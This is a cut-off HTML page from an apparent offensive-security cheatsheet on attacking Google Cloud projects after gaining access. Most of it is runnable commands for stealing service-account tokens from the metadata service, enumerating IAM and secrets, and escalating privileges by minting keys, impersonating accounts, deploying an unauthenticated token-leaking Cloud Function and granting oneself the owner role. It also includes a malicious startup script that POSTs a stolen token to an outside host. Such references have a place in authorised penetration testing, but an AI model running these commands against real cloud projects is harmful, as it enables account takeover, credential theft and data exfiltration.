@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GCP | JinPwn</title><meta name="description" content="Google Cloud Platform attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside a GCP project.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/cloud/gcp/">
+<meta property="og:title" content="GCP | JinPwn">
+<meta property="og:description" content="Google Cloud Platform attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside a GCP project.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/cloud/gcp/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GCP | JinPwn">
+<meta name="twitter:description" content="Google Cloud Platform attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside a GCP project.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Google Cloud Platform attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside a GCP project.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"GCP | JinPwn","url":"https://jinpwn.dev/cheatsheets/cloud/gcp/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Cloud Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/cloud/" class="cheatsheet-sidebar-section">Cloud Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-sidebar-link">Cloud MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-sidebar-link">Cloud Recon</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-sidebar-link">Cloud Storage</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/aws/" class="cheatsheet-sidebar-link">AWS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/azure/" class="cheatsheet-sidebar-link">Azure</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-sidebar-link is-current">GCP</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>GCP</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">GCP</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Cloud Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/cloud/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-mobile-sections-link">Cloud MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-mobile-sections-link">Cloud Recon</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-mobile-sections-link">Cloud Storage</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/aws/" class="cheatsheet-mobile-sections-link">AWS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/azure/" class="cheatsheet-mobile-sections-link">Azure</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-mobile-sections-link is-current">GCP</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Google Cloud Platform attack surface. Storage in <a href="https://jinpwn.dev/cheatsheets/cloud/cloud-storage/">Cloud Storage</a>
+, external recon in <a href="https://jinpwn.dev/cheatsheets/cloud/cloud-recon/">Cloud Recon</a>
+. This file covers what to do once you have credentials or are inside a GCP project.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">PROJECT</span><span class="o">=</span>target-prod
+</span></span><span class="line"><span class="cl"><span class="nv">SA</span><span class="o">=</span>svc-account@target-prod.iam.gserviceaccount.com
+</span></span></code></pre></div><h2 id="i-authentication-options" data-heading-permalink="true"><span class="heading-content">i. Authentication options</span>
+    <a class="heading-permalink" href="#i-authentication-options" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="service-account-key-file-most-common-foothold" data-heading-permalink="true"><span class="heading-content">Service Account key file (most common foothold)</span>
+    <a class="heading-permalink" href="#service-account-key-file-most-common-foothold" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>JSON key file (<code>-----BEGIN PRIVATE KEY-----</code> inside):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud auth activate-service-account --key-file<span class="o">=</span>key.json
+</span></span><span class="line"><span class="cl">gcloud auth list                          <span class="c1">## confirm active identity</span>
+</span></span><span class="line"><span class="cl">gcloud config <span class="nb">set</span> project <span class="nv">$PROJECT</span>
+</span></span></code></pre></div><h3 id="application-default-credentials-adc" data-heading-permalink="true"><span class="heading-content">Application Default Credentials (ADC)</span>
+    <a class="heading-permalink" href="#application-default-credentials-adc" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud auth application-default login
+</span></span><span class="line"><span class="cl"><span class="c1">## ADC stored in: ~/.config/gcloud/application_default_credentials.json</span>
+</span></span></code></pre></div><h3 id="access-token-directly" data-heading-permalink="true"><span class="heading-content">Access token directly</span>
+    <a class="heading-permalink" href="#access-token-directly" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Get a token for an active identity:</span>
+</span></span><span class="line"><span class="cl"><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>gcloud auth print-access-token<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Use it directly:</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&#34;</span> <span class="s2">&#34;https://cloudresourcemanager.googleapis.com/v1/projects&#34;</span>
+</span></span></code></pre></div><h3 id="personal-user-auth-interactive" data-heading-permalink="true"><span class="heading-content">Personal user auth (interactive)</span>
+    <a class="heading-permalink" href="#personal-user-auth-interactive" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud auth login
+</span></span><span class="line"><span class="cl">gcloud auth login --no-launch-browser     <span class="c1">## for headless / SSH</span>
+</span></span></code></pre></div><h2 id="ii-metadata-service-inside-compute-engine" data-heading-permalink="true"><span class="heading-content">ii. Metadata service inside Compute Engine</span>
+    <a class="heading-permalink" href="#ii-metadata-service-inside-compute-engine" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have RCE or SSRF on a Compute Engine instance, hit the metadata service. GCP requires the <code>Metadata-Flavor: Google</code> header - missing it returns 403.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Test access:</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Instance attributes (often contain startup scripts with secrets):</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/instance/attributes/&#34;</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Service account token (instant identity):</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Returns access_token, scopes, expires_in.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Service account identity:</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## All metadata at once:</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/?recursive=true&amp;alt=json&#34;</span>
+</span></span></code></pre></div><p>Set the env var to use the token directly with gcloud:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>curl -sH <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#34;</span> <span class="p">|</span> jq -r .access_token<span class="k">)</span>
+</span></span><span class="line"><span class="cl">gcloud auth login --cred-file<span class="o">=</span>&lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;{\&#34;access_token\&#34;:\&#34;</span><span class="nv">$TOKEN</span><span class="s2">\&#34;,\&#34;type\&#34;:\&#34;authorized_user\&#34;}&#34;</span><span class="o">)</span> --no-launch-browser
+</span></span></code></pre></div><h2 id="iii-identity-and-scope-enumeration" data-heading-permalink="true"><span class="heading-content">iii. Identity and scope enumeration</span>
+    <a class="heading-permalink" href="#iii-identity-and-scope-enumeration" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud auth list
+</span></span><span class="line"><span class="cl">gcloud config list
+</span></span><span class="line"><span class="cl">gcloud projects list                      <span class="c1">## what projects can I see?</span>
+</span></span><span class="line"><span class="cl">gcloud organizations list                 <span class="c1">## any org-level rights?</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Service account this identity belongs to:</span>
+</span></span><span class="line"><span class="cl">gcloud iam service-accounts list --project<span class="o">=</span><span class="nv">$PROJECT</span>
+</span></span><span class="line"><span class="cl">gcloud iam service-accounts get-iam-policy <span class="nv">$SA</span> --project<span class="o">=</span><span class="nv">$PROJECT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## IAM policy of the project (who has what):</span>
+</span></span><span class="line"><span class="cl">gcloud projects get-iam-policy <span class="nv">$PROJECT</span> --format<span class="o">=</span>json
+</span></span><span class="line"><span class="cl"><span class="c1">## Filter to your principal:</span>
+</span></span><span class="line"><span class="cl">gcloud projects get-iam-policy <span class="nv">$PROJECT</span> --flatten<span class="o">=</span><span class="s2">&#34;bindings[].members&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --format<span class="o">=</span><span class="s1">&#39;table(bindings.role,bindings.members)&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter<span class="o">=</span><span class="s2">&#34;bindings.members:user:you@example.com&#34;</span>
+</span></span></code></pre></div><p>Org / folder level (if accessible):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud organizations get-iam-policy ORG_ID
+</span></span><span class="line"><span class="cl">gcloud resource-manager folders list --organization<span class="o">=</span>ORG_ID
+</span></span><span class="line"><span class="cl">gcloud resource-manager folders get-iam-policy FOLDER_ID
+</span></span></code></pre></div><h2 id="iv-enumerate-resources" data-heading-permalink="true"><span class="heading-content">iv. Enumerate resources</span>
+    <a class="heading-permalink" href="#iv-enumerate-resources" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Compute Engine VMs:</span>
+</span></span><span class="line"><span class="cl">gcloud compute instances list
+</span></span><span class="line"><span class="cl">gcloud compute instances describe NAME --zone<span class="o">=</span>us-central1-a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Storage buckets:</span>
+</span></span><span class="line"><span class="cl">gcloud storage ls
+</span></span><span class="line"><span class="cl"><span class="c1">## Per bucket:</span>
+</span></span><span class="line"><span class="cl">gcloud storage buckets describe gs://BUCKET
+</span></span><span class="line"><span class="cl">gcloud storage objects list gs://BUCKET/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Cloud Functions:</span>
+</span></span><span class="line"><span class="cl">gcloud functions list --regions<span class="o">=</span>us-central1
+</span></span><span class="line"><span class="cl">gcloud functions describe FUNCNAME --region<span class="o">=</span>us-central1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Cloud Run services:</span>
+</span></span><span class="line"><span class="cl">gcloud run services list
+</span></span><span class="line"><span class="cl">gcloud run services describe SVCNAME --region<span class="o">=</span>us-central1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## GKE (Kubernetes) clusters:</span>
+</span></span><span class="line"><span class="cl">gcloud container clusters list
+</span></span><span class="line"><span class="cl">gcloud container clusters get-credentials CLUSTER --region<span class="o">=</span>us-central1
+</span></span><span class="line"><span class="cl">kubectl get pods -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Secret Manager:</span>
+</span></span><span class="line"><span class="cl">gcloud secrets list
+</span></span><span class="line"><span class="cl">gcloud secrets versions list SECRET_NAME
+</span></span><span class="line"><span class="cl">gcloud secrets versions access latest --secret<span class="o">=</span>SECRET_NAME
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## SQL instances:</span>
+</span></span><span class="line"><span class="cl">gcloud sql instances list
+</span></span><span class="line"><span class="cl">gcloud sql databases list --instance<span class="o">=</span>INST
+</span></span></code></pre></div><h2 id="v-the-big-privesc-paths" data-heading-permalink="true"><span class="heading-content">v. The big privesc paths</span>
+    <a class="heading-permalink" href="#v-the-big-privesc-paths" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>GCP IAM permissions are fine-grained. A handful of permissions unlock most privesc.</p>
+<h3 id="iamserviceaccountkeyscreate---issue-your-own-key" data-heading-permalink="true"><span class="heading-content">iam.serviceAccountKeys.create - issue your own key</span>
+    <a class="heading-permalink" href="#iamserviceaccountkeyscreate---issue-your-own-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If you can create a key for ANY service account, you can authenticate as it forever:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud iam service-accounts keys create attacker.json --iam-account<span class="o">=</span>admin-sa@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com
+</span></span><span class="line"><span class="cl">gcloud auth activate-service-account --key-file<span class="o">=</span>attacker.json
+</span></span></code></pre></div><h3 id="iamserviceaccountsgetaccesstoken---directly-impersonate" data-heading-permalink="true"><span class="heading-content">iam.serviceAccounts.getAccessToken - directly impersonate</span>
+    <a class="heading-permalink" href="#iamserviceaccountsgetaccesstoken---directly-impersonate" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Even cleaner than key creation, no persistent artifact:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud iam service-accounts get-iam-policy admin-sa@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com
+</span></span><span class="line"><span class="cl"><span class="c1">## If your identity has roles/iam.serviceAccountTokenCreator on the target:</span>
+</span></span><span class="line"><span class="cl"><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>gcloud auth print-access-token --impersonate-service-account<span class="o">=</span>admin-sa@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Or for any gcloud command:</span>
+</span></span><span class="line"><span class="cl">gcloud projects list --impersonate-service-account<span class="o">=</span>admin-sa@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com
+</span></span></code></pre></div><h3 id="iamserviceaccountsactas--create-something-that-runs-as" data-heading-permalink="true"><span class="heading-content">iam.serviceAccounts.actAs + create-something-that-runs-as</span>
+    <a class="heading-permalink" href="#iamserviceaccountsactas--create-something-that-runs-as" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p><code>actAs</code> is required for &ldquo;I can attach this SA to a resource I create&rdquo;. The resource (function, VM, etc) then runs as the SA and the SA&rsquo;s permissions become yours.</p>
+<p>Combinations:</p>
+<ul>
+<li><code>iam.serviceAccounts.actAs</code> + <code>compute.instances.create</code> → create VM with target SA, SSH in, use IMDS</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud compute instances create pwn-vm <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --service-account<span class="o">=</span>admin-sa@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --scopes<span class="o">=</span>cloud-platform <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --zone<span class="o">=</span>us-central1-a <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --image-family<span class="o">=</span>debian-12 --image-project<span class="o">=</span>debian-cloud
+</span></span><span class="line"><span class="cl"><span class="c1">## SSH:</span>
+</span></span><span class="line"><span class="cl">gcloud compute ssh pwn-vm --zone<span class="o">=</span>us-central1-a
+</span></span><span class="line"><span class="cl"><span class="c1">## Then hit metadata:</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Metadata-Flavor: Google&#34;</span> <span class="s2">&#34;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#34;</span>
+</span></span></code></pre></div><ul>
+<li><code>iam.serviceAccounts.actAs</code> + <code>cloudfunctions.functions.create</code> → Function runs as target SA</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p func <span class="o">&amp;&amp;</span> <span class="nb">cd</span> func
+</span></span><span class="line"><span class="cl">cat &gt; main.py <span class="s">&lt;&lt;&#39;EOF&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s">import subprocess
+</span></span></span><span class="line"><span class="cl"><span class="s">def hello_world(request):
+</span></span></span><span class="line"><span class="cl"><span class="s">    out = subprocess.check_output([&#39;gcloud&#39;, &#39;auth&#39;, &#39;print-access-token&#39;])
+</span></span></span><span class="line"><span class="cl"><span class="s">    return out
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">cat &gt; requirements.txt <span class="s">&lt;&lt;EOF
+</span></span></span><span class="line"><span class="cl"><span class="s">google-auth
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">gcloud functions deploy pwn-func <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --runtime<span class="o">=</span>python311 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --trigger-http --allow-unauthenticated <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --service-account<span class="o">=</span>admin-sa@<span class="nv">$PROJECT</span>.iam.gserviceaccount.com <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --entry-point<span class="o">=</span>hello_world
+</span></span><span class="line"><span class="cl"><span class="c1">## Get function URL, invoke it, get token</span>
+</span></span></code></pre></div><ul>
+<li>
+<p><code>iam.serviceAccounts.actAs</code> + <code>run.services.create</code> → Cloud Run runs as target SA (same pattern)</p>
+</li>
+<li>
+<p><code>iam.serviceAccounts.actAs</code> + <code>deploymentmanager.deployments.create</code> → Deployment Manager runs as the Google APIs service account (often has org-level rights, this one is BIG)</p>
+</li>
+</ul>
+<h3 id="iamrolesupdate---modify-a-custom-role-to-add-more-permissions" data-heading-permalink="true"><span class="heading-content">iam.roles.update - modify a custom role to add more permissions</span>
+    <a class="heading-permalink" href="#iamrolesupdate---modify-a-custom-role-to-add-more-permissions" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud iam roles update ROLE_NAME --project<span class="o">=</span><span class="nv">$PROJECT</span> --add-permissions<span class="o">=</span>resourcemanager.projects.setIamPolicy
+</span></span></code></pre></div><h3 id="resourcemanagerprojectssetiampolicy---grant-yourself-any-role" data-heading-permalink="true"><span class="heading-content">resourcemanager.projects.setIamPolicy - grant yourself any role</span>
+    <a class="heading-permalink" href="#resourcemanagerprojectssetiampolicy---grant-yourself-any-role" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud projects add-iam-policy-binding <span class="nv">$PROJECT</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --member<span class="o">=</span>user:you@example.com --role<span class="o">=</span>roles/owner
+</span></span></code></pre></div><h3 id="cloudbuildbuildscreate---cloud-build-runs-with-the-cloud-build-sa-which-has-project-editor-by-default" data-heading-permalink="true"><span class="heading-content">cloudbuild.builds.create - Cloud Build runs with the Cloud Build SA, which has Project Editor by default</span>
+    <a class="heading-permalink" href="#cloudbuildbuildscreate---cloud-build-runs-with-the-cloud-build-sa-which-has-project-editor-by-default" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud builds submit --config<span class="o">=</span>cloudbuild.yaml
+</span></span><span class="line"><span class="cl"><span class="c1">## cloudbuild.yaml runs a step that exfiltrates the build&#39;s default SA token</span>
+</span></span></code></pre></div><h2 id="vi-specific-service-attacks" data-heading-permalink="true"><span class="heading-content">vi. Specific service attacks</span>
+    <a class="heading-permalink" href="#vi-specific-service-attacks" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="compute-engine" data-heading-permalink="true"><span class="heading-content">Compute Engine</span>
+    <a class="heading-permalink" href="#compute-engine" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>compute.instances.setMetadata</code> → add a startup script that runs on next boot, instance runs it as the attached SA</li>
+<li><code>compute.instances.osLogin</code> → SSH into VMs you have OS Login rights on</li>
+<li><code>compute.instances.addAccessConfig</code> → expose internal VMs publicly</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Add a malicious startup script:</span>
+</span></span><span class="line"><span class="cl">gcloud compute instances add-metadata TARGET_VM --zone<span class="o">=</span>us-central1-a <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --metadata<span class="o">=</span>startup-script<span class="o">=</span><span class="s1">&#39;#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="s1">curl -H &#34;Metadata-Flavor: Google&#34; &#34;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#34; &gt; /tmp/t.json
+</span></span></span><span class="line"><span class="cl"><span class="s1">curl -X POST -d @/tmp/t.json http://10.10.14.1/x&#39;</span>
+</span></span><span class="line"><span class="cl">gcloud compute instances reset TARGET_VM --zone<span class="o">=</span>us-central1-a
+</span></span></code></pre></div><h3 id="cloud-functions--cloud-run-code-exfil" data-heading-permalink="true"><span class="heading-content">Cloud Functions / Cloud Run code exfil</span>
+    <a class="heading-permalink" href="#cloud-functions--cloud-run-code-exfil" aria-label="Link to this section">
